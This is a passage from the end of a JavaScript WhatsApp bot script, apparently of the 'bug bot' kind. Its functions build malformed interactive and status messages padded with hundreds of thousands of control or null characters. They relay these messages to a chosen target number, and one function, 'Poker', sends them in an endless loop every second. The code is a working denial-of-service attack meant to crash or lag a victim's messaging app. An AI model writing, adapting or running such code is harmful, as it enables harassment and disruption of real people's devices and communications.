    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users", 
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
      }]
    }]
  })

  const Stanza_Id2 = generateWAMessageFromContent("status@broadcast", {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "Kenzy Lyubov", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_message"
        }
      }
    }
  }, {
    ephemeralExpiration: 0,
    forwardingScore: 9741,
    isForwarded: true,
    font: Math.floor(Math.random() * 99999999),
    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
  })

  await sock.relayMessage("status@broadcast", Stanza_Id2.message, {
    messageId: Stanza_Id2.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users", 
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
      }]
    }]
  })
}

async function Poker(sock, target) {
      while (true) {
          try {
           const msg = {
        interactiveMessage: {
      header: {
        title: "\u0000".repeat(250000),
        hasMediaAttachment: false
      },
      body: {
        text: "Sv gw woi gw temen lu",
      },
      footer: {
        text: "\u0000".repeat(250000),
      },
      nativeFlowMessage: {
        name: "booking_status",
        messageParamsJson: JSON.stringify({
          limited_time_offer: {
          text: "Diskon 50% — Berakhir dalam 1 jam!",
          url: "https://wa.me/settings",
          copy_code: "PROMOVNX",
          expiration_time: Math.floor(Date.now() / 1000) + 3600
         },
        }),
        buttons: [
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "VnX Is Here",
              copy_code: "VnX",
              url: "{\"display_text\":\"ⓘ ⸸VnX\",\"url\":\"http://wa.mE/stickerpack/VnX\",\"merchant_url\":\"https://wa.me/settings/linked_devices/,,VnX\"}"
             }),
           }
        ]
      }
    },
 };
  
  await sock.relayMessage(target, msg, {
    message: null,
    participant: { jid: target },
    userJid: target,
  });

            await new Promise(resolve => setTimeout(resolve, 1000));
        } catch (err) {
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
    }
}
///////////////////[END FUNC]////////////////
// --- Jalankan Bot ---
(async () => {
console.log(chalk.redBright.bold(`
╭─────────────────────────────╮
│${chalk.white('Memulai Sesi WhatsApp..')}
╰─────────────────────────────╯
`));

startSesi();
bot.launch();
})();
